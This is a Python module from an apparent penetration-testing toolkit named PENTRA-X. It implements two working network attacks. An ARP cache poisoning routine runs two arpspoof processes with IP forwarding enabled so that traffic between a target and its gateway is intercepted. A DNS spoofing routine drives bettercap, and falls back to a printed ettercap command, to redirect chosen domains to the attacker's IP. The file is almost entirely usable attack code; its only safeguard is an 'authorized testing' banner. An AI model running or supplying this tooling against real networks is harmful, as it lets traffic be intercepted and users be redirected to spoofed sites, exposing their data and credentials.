#!/usr/bin/env python3
"""
PENTRA-X ARP Spoofing
ARP cache poisoning for MITM attacks.
"""

import subprocess
import os
from typing import Optional

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter, check_tool_installed, require_root
from ...core.logging import get_logger, log_result


@require_root
def arp_spoof(target: Optional[str] = None, gateway: Optional[str] = None) -> bool:
    """
    Perform ARP spoofing attack.
    
    Args:
        target: Target IP address
        gateway: Gateway IP address
        
    Returns:
        True if attack started, False otherwise
    """
    logger = get_logger()
    
    header("ARP Spoofing Attack")
    
    warning("FOR AUTHORIZED TESTING ONLY!")
    warning("ARP spoofing can disrupt network traffic!")
    
    # Check tool
    if not check_tool_installed('arpspoof'):
        if check_tool_installed('bettercap'):
            info("Consider using bettercap instead")
        error("arpspoof not installed")
        info("Install dsniff: sudo apt install dsniff")
        safe_press_enter()
        return False
    
    # Get target
    if not target:
        target = safe_input(f"{Colors.OKGREEN}Enter target IP: {Colors.ENDC}")
        if not target:
            error("Target required")
            safe_press_enter()
            return False
        target = target.strip()
    
    # Get gateway
    if not gateway:
        gateway = safe_input(f"{Colors.OKGREEN}Enter gateway IP: {Colors.ENDC}")
        if not gateway:
            error("Gateway required")
            safe_press_enter()
            return False
        gateway = gateway.strip()
    
    # Get interface
    interface = safe_input(f"{Colors.OKGREEN}Enter interface (default eth0): {Colors.ENDC}") or 'eth0'
    
    # Enable IP forwarding
    info("Enabling IP forwarding...")
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    except Exception as e:
        error(f"Failed to enable IP forwarding: {e}")
        safe_press_enter()
        return False
    
    logger.tool_start("ARP Spoof", f"{target} <-> {gateway}")
    
    try:
        info(f"Starting ARP spoof: {target} <-> {gateway}")
        info("Press Ctrl+C to stop")
        
        # Run arpspoof
        # We need two instances: target -> gateway and gateway -> target
        import threading
        
        def spoof_target():
            subprocess.run(['arpspoof', '-i', interface, '-t', target, gateway], 
                         capture_output=True)
        
        def spoof_gateway():
            subprocess.run(['arpspoof', '-i', interface, '-t', gateway, target],
                         capture_output=True)
        
        t1 = threading.Thread(target=spoof_target, daemon=True)
        t2 = threading.Thread(target=spoof_gateway, daemon=True)
        
        t1.start()
        t2.start()
        
        success("ARP spoofing started")
        info("Traffic between target and gateway is now intercepted")
        info("Use Wireshark or tcpdump to capture traffic")
        
        # Wait for interrupt
        try:
            t1.join()
        except KeyboardInterrupt:
            pass
        
        warning("Stopping ARP spoof...")
        
        # Disable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        
        info("IP forwarding disabled")
        
        log_result("arp_spoof", f"Target: {target}, Gateway: {gateway}")
        logger.tool_end("ARP Spoof", success=True)
        
        safe_press_enter()
        return True
        
    except KeyboardInterrupt:
        warning("Attack stopped")
        logger.tool_end("ARP Spoof", success=True)
        safe_press_enter()
        return True
    except Exception as e:
        error(f"Attack failed: {e}")
        logger.tool_end("ARP Spoof", success=False)
        safe_press_enter()
        return False


@require_root
def dns_spoof() -> None:
    """
    Perform DNS spoofing attack using Bettercap.
    """
    logger = get_logger()
    header("DNS Spoofing")
    
    warning("FOR AUTHORIZED TESTING ONLY!")
    
    # Check for Bettercap as primary tool
    if not check_tool_installed('bettercap'):
        error("Bettercap is not installed (required for active DNS spoofing)")
        info("Install with: sudo apt install bettercap")
        
        if check_tool_installed('ettercap'):
            info("\nEttercap is available. Manual usage recommended:")
            print(f"  sudo ettercap -T -q -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP// -P dns_spoof")
        
        safe_press_enter()
        return

    # Get attack parameters
    interface = safe_input(f"{Colors.OKGREEN}Network interface (default eth0): {Colors.ENDC}") or 'eth0'
    domains = safe_input(f"{Colors.OKGREEN}Domains to spoof (comma separated, e.g., *.google.com,test.com): {Colors.ENDC}")
    if not domains:
        error("At least one domain is required")
        safe_press_enter()
        return
        
    spoof_ip = safe_input(f"{Colors.OKGREEN}Spoof resolution IP (your IP): {Colors.ENDC}")
    if not spoof_ip:
        error("Spoof IP required")
        safe_press_enter()
        return

    info(f"Starting DNS spoof on {interface}...")
    info(f"Redirecting {domains} to {spoof_ip}")
    info("Press Ctrl+C to stop the attack")
    
    logger.tool_start("DNS Spoof", f"{domains} -> {spoof_ip}")

    # Build Bettercap command
    # -eval runs commands sequentially in bettercap
    caplet_commands = [
        f"set dns.spoof.domains {domains}",
        f"set dns.spoof.address {spoof_ip}",
        "dns.spoof on",
        "events.clear",
        "clear"
    ]
    
    bettercap_cmd = [
        'bettercap',
        '-iface', interface,
        '-eval', "; ".join(caplet_commands)
    ]

    try:
        # Run bettercap interactively
        subprocess.run(bettercap_cmd)
        logger.tool_end("DNS Spoof", success=True)
    except KeyboardInterrupt:
        success("\nDNS Spoofing attack stopped.")
        logger.tool_end("DNS Spoof", success=True)
    except Exception as e:
        error(f"Attack failed: {e}")
        logger.tool_end("DNS Spoof", success=False)
    
    safe_press_enter()


if __name__ == "__main__":
    arp_spoof()
